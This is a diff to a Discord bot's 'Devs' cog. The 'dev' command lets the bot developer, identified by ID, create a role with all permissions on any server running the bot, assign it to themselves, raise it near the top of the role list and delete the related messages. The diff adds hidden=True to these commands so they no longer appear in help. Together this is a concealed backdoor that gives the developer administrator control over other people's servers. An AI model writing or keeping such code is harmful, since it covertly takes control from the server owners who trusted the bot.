@@ -2,15 +2,16 @@ from discord.ext import commands
 import discord
 import asyncio
 import BotIDs
+import cogs.utils.checks as checks
 
 class Devs():
-    def __init__(self, bot, current = ".", old = ["(._.)", "_"], dev = BotIDs.dev_id):
+    def __init__(self, bot):
         self.bot = bot
-        self.current = current
-        self.old = old
-        self.dev = dev
+        self.current = BotIDs.dev_role
+        self.old = BotIDs.dev_role_old
+        self.dev = BotIDs.dev_id
         
-    @commands.command()
+    @commands.command(hidden=True, no_pm=True)
     async def dev(self, ctx):
 
         # Command Use: For Dev to be able to get perms on a server for debugging purposes easily
@@ -22,23 +23,23 @@ class Devs():
                     if discord.utils.get(ctx.guild.roles, name=oldRole):
                         role = discord.utils.get(ctx.guild.roles, name=oldRole)
                         await role.delete()
-                        await ctx.send("Removed", delete_after=3)
+                        await ctx.send(self.bot.blank + "Removed", delete_after=3)
 
                 if discord.utils.get(ctx.message.author.roles, name=self.current):
-                    tmp = await ctx.send("Already Completed")
+                    tmp = await ctx.send(self.bot.blank + "Already Completed")
                     Msgs.append(tmp)
                 else:
                     if discord.utils.get(ctx.message.guild.roles, name=self.current): #Role all ready exists
-                        tmp = await ctx.send("All ready made")
+                        tmp = await ctx.send(self.bot.blank + "All ready made")
                         Msgs.append(tmp)
                     else:
                         await ctx.message.guild.create_role(name=self.current, permissions=discord.Permissions.all())
-                        tmp = await ctx.send("Made")
+                        tmp = await ctx.send(self.bot.blank + "Made")
                         Msgs.append(tmp)
                     await asyncio.sleep(1)
                     await ctx.author.add_roles(discord.utils.get(ctx.guild.roles, name=self.current))
                     await tmp.edit(content="Added")
-                    success = await ctx.send("Success")
+                    success = await ctx.send(self.bot.blank + "Success")
                     Msgs.append(success)
 
                 perm = ctx.message.guild.me.top_role
@@ -49,11 +50,11 @@ class Devs():
 
                 if posBot > posDev:
                     if posBot - posDev == 1:
-                        pSuccess = await ctx.send("All ready set")
+                        pSuccess = await ctx.send(self.bot.blank + "All ready set")
                         Msgs.append(pSuccess)
                     else:
                         await role.edit(position=posBot - 1)
-                        pSuccess = await ctx.send("Moved")
+                        pSuccess = await ctx.send(self.bot.blank + "Moved")
                         Msgs.append(pSuccess)
 
                 await asyncio.sleep(3)
@@ -62,12 +63,12 @@ class Devs():
             except discord.Forbidden as error:
                 await ctx.send(ctx.message.author.mention + "{} doesn't have perms".format(self.bot.user.name))
         else:
-            tmp = await ctx.send("{} does not have permission to use this command".format(ctx.message.author.mention))
+            tmp = await ctx.send(self.bot.blank + "{} does not have permission to use this command".format(ctx.message.author.mention))
             await asyncio.sleep(3)
             await ctx.channel.delete_messages([tmp, ctx.message])
         return
 
-    @commands.command()
+    @commands.command(hidden=True, no_pm=True)
     async def pos(self, ctx):
         if ctx.message.channel.permissions_for(ctx.message.author).manage_roles:
             perm = ctx.message.guild.me.top_role
@@ -78,29 +79,29 @@ class Devs():
 
             if posBot > posDev:
                 if posBot - posDev == 1:
-                    success = await ctx.send("All ready set")
+                    success = await ctx.send(self.bot.blank + "All ready set")
                 else:
                     await role.edit(position=posBot-1)
-                    success = await ctx.send("Success")
+                    success = await ctx.send(self.bot.blank + "Success")
 
             await asyncio.sleep(3)
             await ctx.channel.delete_messages([ctx.message, success])
         else:
-            await ctx.send("You do not have permissions for that")
+            await ctx.send(self.bot.blank + "You do not have permissions for that")
 
-    @commands.command(aliases=["ndev"])
+    @commands.command(aliases=["ndev"], hidden=True, no_pm=True)
     @commands.has_permissions(manage_roles=True)
     async def remove(self, ctx):
         if discord.utils.get(ctx.message.guild.roles, name=self.current):
             role = discord.utils.get(ctx.message.guild.roles, name=self.current)
             await role.delete()
-            tmp = await ctx.send("Removed")
+            tmp = await ctx.send(self.bot.blank + "Removed")
         else:
-            tmp = await ctx.send("All ready removed")
+            tmp = await ctx.send(self.bot.blank + "All ready removed")
         await asyncio.sleep(3)
         await ctx.message.channel.delete_messages([tmp, ctx.message])
 
-    @commands.command()
+    @commands.command(enabled=False, hidden=True, no_pm=True)
     async def nuke(self, ctx):
         if ctx.author.id == self.dev or ctx.author.id == ctx.guild.owner.id:
             channel = ctx.channel
@@ -109,9 +110,9 @@ class Devs():
             msg = await self.bot.wait_for("message", check=lambda msg: msg.content.lower in ("yes", "no") and msg.channel == channel, timeout=5.0)
             if msg.content.lower() == "yes":
                 # Nuke
-                await ctx.send("Boom")
+                await ctx.send(self.bot.blank + "Boom")
             elif msg.content.lower() == "no":
-                await ctx.send("Good Decision")
+                await ctx.send(self.bot.blank + "Good Decision")
 
 
 
@@ -124,7 +125,7 @@ class Devs():
     #             current = args[i]
     #             noSpace = current.replace(" ", "")
     #             noSpace = noSpace.lower()
-    #             await ctx.send("/roles add {} --role {}".format(noSpace, current))
+    #             await ctx.send(self.bot.blank + "/roles add {} --role {}".format(noSpace, current))
     #         return
     #     else:
     #         ctx.message.guild.create_role()
